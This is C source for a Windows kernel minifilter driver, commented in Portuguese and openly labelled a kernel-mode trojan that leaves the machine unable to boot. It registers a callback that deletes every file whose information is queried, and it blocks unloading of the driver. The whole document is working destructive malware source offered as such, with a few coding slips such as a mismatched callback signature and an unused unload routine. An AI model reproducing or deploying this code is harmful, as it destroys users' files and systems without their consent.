
/*

	Trojan em modo-kernel, após executar o driver, sua máquina não ligará mais

*/

#include <fltKernel.h>
#include <ntstrsafe.h>

PFLT_FILTER Filter;

NTSTATUS MiniUnload(
	_In_ FLT_FILTER_UNLOAD_FLAGS Flags
)
/*

	Função que descarrega o driver

*/
{
	UNREFERENCED_PARAMETER(Flags);

	FltUnregisterFilter(Filter);
	return STATUS_SUCCESS;
}

FLT_PREOP_CALLBACK_STATUS FileProtect(
	_In_ PFLT_CALLBACK_DATA Data,
	_In_ PCFLT_RELATED_OBJECTS Objects,
	_In_ PVOID* Context
)
/*

	Sempre que um arquivo for lido, ou obtém as informações dele, o mesmo será deletado

*/
{
	UNREFERENCED_PARAMETER(Context);

	// NTSTATUS para retornar
	NTSTATUS returnValue = FLT_PREOP_SUCCESS_NO_CALLBACK;
	NTSTATUS Status;

	// Informações do arquivo
	PFLT_FILE_NAME_INFORMATION FileNameInfo;

	Status = FltGetFileNameInformation(
		Data,
		FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT,
		&FileNameInfo
	);

	if (NT_SUCCESS(Status))
	{
		Status = FltParseFileNameInformation(FileNameInfo);

		if (NT_SUCCESS(Status))
		{
			// Informações, que vão ser usadas para informar que queremos deletar
			// Um arquivo
			FILE_DISPOSITION_INFORMATION DeleteFile;
			DeleteFile.DeleteFile = TRUE;

			// Delete o arquivo
			Status = FltSetInformationFile(
				Objects->Instance,
				Objects->FileObject,
				&DeleteFile,
				sizeof(FILE_DISPOSITION_INFORMATION),
				FileDispositionInformation
			);

			// Se o arquivo for deletado
			if (NT_SUCCESS(Status))
			{
				KdPrint(("Deletation sucessfully!"));
			}

			// Se falhar
			else {
				KdPrint(("Deletation failed!"));
			}
		}

		FltReleaseFileNameInformation(FileNameInfo);
	}

	// Retorne o status atual
	return returnValue;
}

const FLT_OPERATION_REGISTRATION Callbacks[] = {
	{IRP_MJ_QUERY_INFORMATION, NULL, FileProtect, NULL},
	{IRP_MJ_OPERATION_END}
};

const FLT_REGISTRATION Registration[] = {
	sizeof(FLT_REGISTRATION),
	FLT_REGISTRATION_VERSION,
	0,
	NULL,
	Callbacks,
	NULL, // Impeça que o driver seja descarregado
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL,
	NULL
};

NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
)
/*

	Função que inicia o driver

*/
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS Status = FltRegisterFilter(DriverObject, &Registration, &Filter);

	if (NT_SUCCESS(Status))
	{
		Status = FltStartFiltering(Filter);
	}

	return STATUS_SUCCESS;
}
